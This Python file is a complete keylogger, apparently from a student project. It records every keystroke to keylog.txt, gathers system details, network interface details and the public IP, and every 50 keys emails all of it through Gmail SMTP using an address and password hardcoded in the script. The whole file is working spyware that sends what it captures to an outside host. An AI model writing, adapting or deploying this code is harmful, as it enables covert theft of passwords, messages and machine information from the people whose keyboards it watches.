import subprocess
import sys
import logging
import smtplib
import ssl
import psutil
import time
import platform
from datetime import datetime
from requests import get
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.application import MIMEApplication
subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

## Initialise variables
keys = []
count = 0

## Logging file
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

## Retrieving System Information + Network Information
# Making bytes sorted
def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

# Print system information
uname = platform.uname()
sysInfo = f"======================================== System Information ======================================== \nSystem: {uname.system} \nNode Name: {uname.node} \nRelease: {uname.release} \nVersion: {uname.version} \nMachine: {uname.machine} \nProcessor: {uname.processor}\n"

# Network information
netInfo = f"======================================== Network Information ========================================\n"
# Get all network interfaces (virtual and physical)
if_addrs = psutil.net_if_addrs()
for interface_name, interface_addresses in if_addrs.items():
    for address in interface_addresses:
        if str(address.family) == 'AddressFamily.AF_INET':
            netInfo += f"=== Interface (INET): {interface_name} ===\nIP Address: {address.address}\nNetmask: {address.netmask}\nBroadcast IP: {address.broadcast}\n"
        elif str(address.family) == 'AddressFamily.AF_INET6':
            netInfo += f"=== Interface (INET6): {interface_name} ===\nMAC Address: {address.address}\nNetmask: {address.netmask}\nBroadcast MAC: {address.broadcast}\n"           
# Get IO statistics since boot
net_io = psutil.net_io_counters()
netInfo += f"\nTotal Bytes Sent: {get_size(net_io.bytes_sent)}\n"
netInfo += f"Total Bytes Received: {get_size(net_io.bytes_recv)}\n"

# Get Public IP address
ip = get('https://api.ipify.org').text
pubIP = f"User's public IP address is: {ip}\n"

## Keylogging 
# Keystrokes detected
def on_press(key):
    global keys, count
    logging.info(str(key))
    print(key, "typed")
    # Adding key pressed to keys array
    keys.append(str(key))
    count += 1
    # Key limit, change after testing over
    if count > 50:
        # Reset key count
        count = 0
        email(keys)
        # Clear keys array after sending email
        keys = []

# Send logging content to Email
def email(keys):
    message = ""
    message += f"{sysInfo}{netInfo}{pubIP}======================================== Past 50 Recorded Keystrokes ========================================\n"
    for key in keys:
        # Replace miscellenous characters to make it more readable
        x = key.replace("'", "")
        message += x
    # Debug terminal message
    print(message)
    # Sending the message
    sendEmail(message)

# Email information
def sendEmail(message):
    # For SSL
    port = 465
    smtp_server = "smtp.gmail.com"
    # Sender's email
    senderEmail = "fypkeylogger@gmail.com"
    password = "keylog123##"
    # Receiver's email
    receiverEmail = "fypkeylogger@gmail.com"
    
    # Delay so that if file does not exist prior, it will exist then code below will run and detect file
    time.sleep(0.2)
    # Setting text file attachment (keylog.txt)
    attachmentMessage = MIMEMultipart('mixed')
    attachmentMessage['Subject'] = str(datetime.now())
    attachmentPath = "keylog.txt"
    try:
        with open(attachmentPath, "rb") as attachment:
            p = MIMEApplication(attachment.read(),_subtype="text")	
            p.add_header('Content-Disposition', "attachment; filename= %s" % attachmentPath.split("\\")[-1]) 
            attachmentMessage.attach(p)
    except Exception as e:
        print(str(e))
    attachmentMessage = attachmentMessage.as_string()

    # Send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(senderEmail, password)
        # Sending text file
        server.sendmail(senderEmail, receiverEmail, attachmentMessage)
        # Sending system information
        server.sendmail(senderEmail, receiverEmail, message)

# Record keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()
